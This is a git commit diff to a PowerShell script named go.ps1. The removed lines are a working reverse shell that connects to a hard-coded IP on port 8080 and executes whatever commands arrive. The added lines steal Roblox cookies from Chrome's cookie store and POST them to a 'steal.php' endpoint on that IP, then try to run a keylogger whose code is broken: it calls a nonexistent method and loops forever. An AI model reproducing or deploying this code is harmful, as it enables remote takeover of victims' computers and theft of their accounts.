65e6a60b9ae452d18310b1c851bb88e784de036a
makinbank123456789-web <makinbank123456789@gmail.com>
2025-11-07 01:52:57 -0500

    Update go.ps1

--- go.ps1
+++ go.ps1
@@ -1,11 +1,17 @@
-$c = New-Object Net.Sockets.TCPClient('76.112.215.80',8080);
-$s = $c.GetStream();
-[byte[]]$b = 0..65535|%{0};
-while(($i = $s.Read($b,0,$b.Length)) -ne 0){
-  $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
-  $x = (iex $d 2>&1 | Out-String)
-  $x = $x + "PS " + (pwd).Path + "> "
-  $sb = ([text.encoding]::ASCII).GetBytes($x)
-  $s.Write($sb,0,$sb.Length);$s.Flush()
-}
-$c.Close()
+     # Steal Roblox cookies from Chrome (hypothetical - AV will block)
+     $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+     if (Test-Path $chromePath) {
+         $cookies = Get-Content $chromePath | Select-String "roblox.com" | Out-String
+         Invoke-WebRequest -Uri "http://76.112.215.80:8080/steal.php" -Method POST -Body $cookies
+     }
+     # Or keylog for passwords
+     Add-Type -AssemblyName System.Windows.Forms
+     while ($true) { 
+         if ([System.Windows.Forms.Control]::MouseButtons -band [System.Windows.Forms.MouseButtons]::Left) { 
+             # Log keystrokes - simplified
+             $log += [System.Windows.Forms.SendKeys]::GetKeystroke()
+         }
+         Start-Sleep -Milliseconds 10
+     }
+     # Send log to your server
+     Invoke-WebRequest -Uri "http://76.112.215.80:8080/log.php" -Method POST -Body $log
